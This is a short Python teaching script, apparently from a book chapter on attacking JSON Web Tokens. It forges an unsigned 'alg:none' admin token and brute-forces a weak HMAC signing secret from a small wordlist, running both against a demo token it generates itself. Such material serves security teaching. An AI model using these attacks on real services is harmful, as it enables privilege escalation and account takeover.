"""
Chapter 5 - Attacking JWTs.
Two classic weaknesses against the demo API's tokens:
  1. alg:none forgery (strip the signature).
  2. Weak-secret brute force (dictionary attack on the HMAC key).
"""
import jwt

WORDLIST = ["password", "123456", "secret", "admin", "changeme"]


def forge_alg_none(user_id: int = 1, role: str = "admin") -> str:
    """Craft an unsigned token; vulnerable servers that skip verification accept it."""
    return jwt.encode({"sub": user_id, "role": role}, key="", algorithm="none")


def brute_force_secret(token: str, words=WORDLIST) -> str | None:
    for candidate in words:
        try:
            jwt.decode(token, candidate, algorithms=["HS256"])
            return candidate
        except jwt.InvalidSignatureError:
            continue
        except jwt.PyJWTError:
            continue
    return None


if __name__ == "__main__":
    print("Forged alg:none admin token:", forge_alg_none())
    # A token from the demo API is signed with the weak secret "secret":
    sample = jwt.encode({"sub": 2, "role": "user"}, "secret", algorithm="HS256")
    print("Recovered secret:", brute_force_secret(sample))
